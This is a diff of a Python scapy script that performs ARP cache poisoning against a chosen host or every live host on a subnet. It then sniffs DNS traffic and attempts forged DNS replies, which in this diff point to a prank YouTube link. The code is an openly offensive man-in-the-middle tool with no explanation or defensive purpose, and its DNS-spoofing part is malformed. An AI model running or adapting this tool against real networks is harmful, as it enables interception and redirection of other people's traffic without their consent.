@@ -1,27 +1,43 @@
 from scapy.layers.l2 import *
 from scapy.sendrecv import send, sniff
-import sys 
+
+import sys
+
+
+
 
 def spoofarpcache(targetip, targetmac, sourceip):
-	send(ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac), verbose=False)
+    send(ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac), verbose=False)
+
+def sendFakeDNS(pkt):
+    print(pkt)
+    dnsResPacket = DNS(rd=1, qd=DNSQR(qname="https://www.youtube.com/watch?v=dQw4w9WgXcQ"))
+    send(dnsResPacket)
 
 def DNSSpoofing(iptarget):
-   a = sniff(filter="port 53")
+   a = sniff(filter="udp and port 53", prn=sendFakeDNS)
    a.nsummary()
 
+
+
 def restorearp(targetip, targetmac, sourceip, sourcemac):
-	packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
-	send(packet, verbose=False)
-	print("ARP Table restored to normal for", targetip)
+    packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
+    send(packet, verbose=False)
+    print("ARP Table restored to normal for", targetip)
+
+
 
 def MultiSniffing(ippasserelle):
-	ipt = {}
-	ip = ".".join(ippasserelle.split(".")[:-1]) + "."
-	for num in range(1, 255):
-		if str(arping(ip + str(num))[0])[-2] != "0":
-			ipt[ip + str(num)] = getmacbyip(ip + str(num))
-			SingleSniffing(ip + str(num), ippasserelle)
-	print(ipt)
+    ipt = {}
+    ip = ".".join(ippasserelle.split(".")[:-1]) + "."
+    for num in range(1, 255):
+        if str(arping(ip + str(num))[0])[-2] != "0":
+            ipt[ip + str(num)] = getmacbyip(ip + str(num))
+            SingleSniffing(ip + str(num), ippasserelle)
+    print(ipt)
+
+
+
 
 
 def SingleSniffing(targetip, passerelleip):
@@ -31,14 +47,18 @@ def SingleSniffing(targetip, passerelleip):
         gatewaymac = getmacbyip(conf.route.route(passerelleip)[2])
         try:
             print("Sending spoofed ARP responses")
-            #while True:
+
             spoofarpcache(targetip, targetmac, gatewayip)
             spoofarpcache(gatewayip, gatewaymac, targetip)
+
             DNSSpoofing(targetip)
+
         except KeyboardInterrupt:
             print("ARP spoofing stopped")
+
             restorearp(gatewayip, gatewaymac, targetip, getmacbyip(targetip))
             restorearp(targetip, targetmac, gatewayip, gatewaymac)
+
             quit()
     else:
         print("Ip not reachable")
